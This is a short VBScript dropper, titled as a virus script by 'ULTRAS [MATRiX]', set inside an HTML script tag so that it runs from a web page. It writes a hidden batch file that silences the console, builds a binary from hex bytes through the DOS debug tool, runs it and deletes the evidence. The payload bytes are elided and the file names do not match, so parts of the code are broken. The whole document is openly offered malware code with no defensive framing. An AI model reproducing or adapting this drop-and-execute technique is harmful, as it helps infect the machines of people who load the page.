 ' Virus Script by ULTRAS [MATRiX] : drop & execute file.
 <script Language="VBScript"><!--
 ' � Virus script start here:
 Dim a,f,s
 Set a = CreateObject("Wscript.Shell")
 Set f = CreateObject("Scripting.FileSystemObject")
 Set s = f.CreateTextFile("ultras.bat", 2, False)
 ' � create ultras.bat file and let's write down theree debug script :
 s.WriteLine "@echo off"
 s.WriteLine "ctty nul"
 ' � u debug script start here : 
 s.WriteLine "ECHO E0100 BA 4B 02 BA 58 02 E8 54 00 BA ... etc >>virus.scr"
 s.WriteLine "ECHO u debug script ............................ >>virus.scr"
 ' � End Debug script :
 s.WriteLine "ECHO g >>fire.scr"
 s.WriteLine "ECHO q >>fire.scr"
 s.WriteLine "debug<fire.scr"
 s.WriteLine "del fire.scr"
 s.WriteLine "ctty con"
 ' � close file :
 s.Close
 ' � Execute ultras.bat :
 a.Run ("ultras.bat")
 --></script>
 ' � end virus script

